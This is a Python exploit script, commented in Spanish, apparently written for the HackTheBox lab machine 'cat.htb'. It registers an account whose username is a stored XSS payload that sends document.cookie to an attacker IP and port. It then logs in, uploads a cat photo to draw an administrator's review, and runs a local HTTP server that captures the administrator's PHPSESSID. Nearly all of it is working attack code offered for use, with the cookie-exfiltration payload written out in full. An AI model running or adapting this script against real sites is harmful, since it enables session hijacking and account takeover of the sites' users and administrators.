import requests
import http.server
import socketserver
import threading
import random
import string
import urllib.parse
import sys 

if len(sys.argv) <2:
    print ("[-] Uso python3 xss.py <path de la imagen del gato > ")
    exit()

GATO = sys.argv[1]

TARGET_URL = "http://cat.htb"
ATTACKER_IP = "10.10.14.232"  # Cambia esto a tu IP !!!!
PORT = random.randint(1024, 65535)

# Payload XSS para redirigir la cookie al servidor del atacante
XSS_PAYLOAD = f"<script>document.location='http://{ATTACKER_IP}:{PORT}/?c='+document.cookie;</script>"
USERNAME = XSS_PAYLOAD
EMAIL = f"random@example{PORT}.com"
PASSWORD = "1234"

print(f"Username : {USERNAME}, MAIL : {EMAIL}")

# STAGE 1
## Registra el usuario con el XSS 
def register_user():
    print("[+] Registrando usuario con payload XSS...")
    
    # Url-encodea las variabkes USERNAME y  EMAIL para pasarlos por la url
    encoded_username = urllib.parse.quote(USERNAME)
    encoded_email = urllib.parse.quote(EMAIL)


    url = f"{TARGET_URL}/join.php?username={encoded_username}&email={encoded_email}&password={PASSWORD}&registerForm=Register"
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": f"{TARGET_URL}/join.php",
        "Connection": "keep-alive"
    }

    with requests.Session() as session:
        response = session.get(url, headers=headers, allow_redirects=False)

        if "Registration successful!" in response.text:
            print("[+] Registro exitoso.")
            session_cookie = session.cookies.get("PHPSESSID")
            if session_cookie:
                print(f"[+] PHPSESSID obtenida: {session_cookie}")
                return session_cookie
            else:
                print("[-] No se pudo obtener la cookie PHPSESSID durante el registro.")
                exit()
        else:
            print("[-] Fallo en el registro.")
            exit()

# STAGE 2
## Login
def login_user():
    print("[+] Iniciando sesión como el usuario registrado...")
    print(f"[+] Iniciando sesión con {session_cookie}")
    
    url = f"{TARGET_URL}/join.php?loginUsername={encoded_username}&loginPassword={PASSWORD}&loginForm=Login"
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": f"{TARGET_URL}/join.php",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={session_cookie}"
    }

    response = requests.get(url, headers=headers, allow_redirects=False)

    if response.status_code == 302 :
        print("[+] Inicio de sesión exitoso.")
        return session_cookie
    else:
        print("[-] Fallo en el inicio de sesión.")
        exit()

# STAGE 3
## Upload gato!
def upload_cat():
    print(f"[+] Subiendo el gato seleccionado...")
    url = f"{TARGET_URL}/contest.php"

    boundary = "---------------------------" + "".join(random.choices(string.digits, k=27))

    # Valores seguros para los campos del formulario
    cat_name = "RandomCatName"  
    age = "2"  #
    birthdate = "0001-01-01"  
    weight = "2.5" 

    # Cargamos imagenes
    image_path = GATO
    try:
        with open(image_path, "rb") as image_file:
            image_content = image_file.read()
    except FileNotFoundError:
        print("[-] No se encontró la imagen  Asegúrate de que existe en el mismo directorio.")
        exit()

    # Construye el cuerpo de la solicitud POST
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"cat_name\"\r\n\r\n"
        f"{cat_name}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"age\"\r\n\r\n"
        f"{age}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"birthdate\"\r\n\r\n"
        f"{birthdate}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"weight\"\r\n\r\n"
        f"{weight}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"cat_photo\"; filename=\"punpun.jpg\"\r\n"
        f"Content-Type: image/jpeg\r\n\r\n"
    ).encode() + image_content + f"\r\n--{boundary}--\r\n".encode()

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0",
        "Referer": f"{TARGET_URL}/contest.php",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={session_cookie}"
    }

    headers["Content-Length"] = str(len(body))
    
    response = requests.post(url, data=body, headers=headers)

    if "Cat has been successfully sent for inspection." in response.text:
        print("[+] Gato subido exitosamente.")
    else:
        print("[-] Fallo al subir el gato.")
        print(f"[-] Respuesta del servidor: {response.text}")
        exit()

# Servidor HTTP para capturar la PHPSESSID
#class CapturingHandler(http.server.SimpleHTTPRequestHandler):
#   
#    def do_GET(self):
#        print(f"[+] Recibida solicitud: {self.requestline}")
#        self.send_response(200)
#        self.end_headers()
#        self.wfile.write(b"Cookie recibida correctamente!")
#        query = self.path.split('?')[1]
#        if 'c=' in query:
#            php_session_id = query.split('c=')[1]
#            print(f"[+] PHPSESSID capturada: {php_session_id}")
#



# Stage 4
## Servidor http
cookie_captured = False

class CapturingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Verifica si la solicitud contiene el parámetro 'c='
        if 'c=' in self.path:
            print(f"[+] Recibida solicitud GET: {self.requestline}")
            query = self.path.split('?')[1]  # Obtiene la parte después del '?'
            php_session_id = query.split('c=')[1]
            print(f"[+] PHPSESSID capturada: {php_session_id}")
        else:
            pass
         
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Cookie recibida correctamente!")
        # Si la cookie fue capturada, detiene el servidor (no funciona)
        if cookie_captured:
            print("[+] Deteniendo el servidor HTTP...")
            self.server.shutdown()  # Detiene el servido

def start_http_server(port):
    global cookie_captured  # Usamos la variable global
    cookie_captured = False  # Inicializa la bandera
    print(f"[+] Levantando servidor HTTP en el puerto {port}...")
    with socketserver.TCPServer(("", port), CapturingHandler) as httpd:
        try:
            while not cookie_captured:
                httpd.handle_request()
        except KeyboardInterrupt:
            pass



# Flujo principal del script
if __name__ == "__main__":
    try:
        # Stage  1: Registrar usuario con payload XSS
        session_cookie = register_user()

        if not session_cookie:
            print("[-] No se pudo obtener la cookie PHPSESSID durante el registro. Saliendo...")
            exit()

        # Stage  2: Iniciar sesión como el usuario registrado
        session_cookie = login_user()

        if not session_cookie:
            print("[-] No se pudo iniciar sesión. Saliendo...")
            exit()

        # Stage  3: Subir un gato aleatorio
        upload_cat()

        # Stage  4: Levantar servidor HTTP en un hilo separado
        server_thread = threading.Thread(target=start_http_server, args=(PORT,))
        server_thread.daemon = True
        server_thread.start()

        print(f"[+] Esperando por la PHPSESSID del administrador en http://{ATTACKER_IP}:{PORT}/")
        server_thread.join()  

    except Exception as e:
        print(f"[-] Error en el script: {e}")
        exit()